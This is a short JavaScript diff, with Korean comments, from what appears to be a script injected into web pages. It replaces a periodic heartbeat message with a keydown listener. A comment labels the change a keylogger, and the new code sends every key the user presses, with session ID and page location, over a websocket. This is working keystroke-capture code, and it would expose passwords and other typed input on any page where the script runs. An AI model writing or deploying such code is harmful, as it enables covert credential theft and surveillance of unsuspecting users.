@@ -38,19 +38,17 @@
       pagePath: location.pathname
     });
 
-    //그냥 카운트 신호 보내기....5000번에서 신호 오는지만 확인하자....
-    let counter = 0;
-    setInterval(() => {
-      counter++;
+    //키로거로 수정
+    document.addEventListener("keydown", (e) => {
       safeSend({
-        eventType: "HEARTBEAT",
+        eventType: "KEY_LOG",
         ts: Date.now(),
         sessionId,
-        counter,
+        key: e.key,
         pageOrigin: location.origin,
         pagePath: location.pathname
       });
-    }, 500);//0.5초 간격으로 보내기
+    });
   });
 
   ws.addEventListener("error", () => console.log("[injected] ws error"));//에러 알림
